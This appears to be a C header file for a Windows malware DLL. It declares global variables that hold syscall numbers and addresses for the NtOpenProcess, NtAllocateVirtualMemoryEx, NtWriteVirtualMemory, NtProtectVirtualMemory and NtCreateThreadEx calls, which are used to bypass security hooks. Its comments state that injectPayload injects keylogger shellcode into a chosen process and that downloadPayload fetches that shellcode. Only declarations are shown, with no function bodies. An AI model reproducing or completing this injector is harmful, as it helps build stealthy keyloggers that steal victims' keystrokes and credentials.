#ifndef MAINDLL_H
#define MAINDLL_H

#define STATUS_SUCCESS (NTSTATUS)0x00000000L

#define BUFFER_SIZE 114765

#define InitializeObjectAttributes(p,n,a,r,s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->ObjectName = (n); \
    (p)->Attributes = (a); \
    (p)->RootDirectory = (r); \
    (p)->SecurityDescriptor = (s); \
    (p)->SecurityQualityOfService = NULL; \
}

DWORD g_NtOpenProcessSSN;
QWORD g_NtOpenProcessSyscall;
DWORD g_NtAllocateVirtualMemoryExSSN;
QWORD g_NtAllocateVirtualMemoryExSyscall;
DWORD g_NtWriteVirtualMemorySSN;
QWORD g_NtWriteVirtualMemorySyscall;
DWORD g_NtProtectVirtualMemorySSN;
QWORD g_NtProtectVirtualMemorySyscall;
DWORD g_NtCreateThreadExSSN;
QWORD g_NtCreateThreadExSyscall;
DWORD g_NtFreeVirtualMemorySSN;
QWORD g_NtFreeVirtualMemorySyscall;
DWORD g_NtWaitForSingleObjectSSN;
QWORD g_NtWaitForSingleObjectSyscall;

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
);

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef struct _MEM_EXTENDED_PARAMETER {
    union {
        struct {
            DWORD64 Type;
            DWORD64 Reserved;
        } DUMMYSTRUCTNAME;
        DWORD64 AsUlong64; 
    };
    union {
        DWORD64 ULong64;
        PVOID   Pointer;
        SIZE_T  Size;
        HANDLE  Handle;
        DWORD   ULong;
    } DUMMYUNIONNAME;
} MEM_EXTENDED_PARAMETER, *PMEM_EXTENDED_PARAMETER;

typedef struct _CLIENT_ID {
    DWORD UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

extern NTSTATUS NtFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType
);

extern NTSTATUS NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

extern NTSTATUS NtOpenProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PCLIENT_ID ClientId
);

extern NTSTATUS NtAllocateVirtualMemoryEx(
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG PageProtection,
    _Inout_updates_opt_(ExtendedParameterCount) PMEM_EXTENDED_PARAMETER ExtendedParameters,
    _In_ ULONG ExtendedParameterCount
);

extern NTSTATUS NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, 
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

extern NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PULONG NumberOfBytesToProtect,
    IN ULONG NewAccessProtection,
    OUT PULONG OldAccessProtection
);

extern NTSTATUS NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
);

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
);

/**
 * @brief Entry point for the DLL.
 *
 * @param hinstDLL Handle to the DLL module.
 * @param fdwReason Reason for calling the function. Can be one of:
 *        - DLL_PROCESS_ATTACH: DLL is being loaded into the virtual address space of the current process.
 *        - DLL_PROCESS_DETACH: DLL is being unloaded from the virtual address space of the current process.
 * @param lpReserved Reserved. Not used.
 * @return Always returns TRUE.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

/**
 * @brief Main function injecting a keylogger shellcode into the choosen process.
 *
 * @param processName Pointer to a null-terminated string specifying the process name.
 *                    Must not be NULL.
 * @return DWORD Process ID if the process exists, otherwise returns 0.
 */
DWORD WINAPI injectPayload(LPVOID param);

/**
 * @brief Downloads a shellcode payload into the provided buffer.
 *
 * @param shellcode Pointer to a buffer where the downloaded shellcode will be stored.
 * @param limit The known size of the downloaded shellcode.
 *
 * @return BOOL Returns TRUE if the shellcode was successfully downloaded into the buffer,
 *              otherwise returns FALSE.
 */
BOOL downloadPayload(unsigned char* shellcode, size_t limit);

#endif
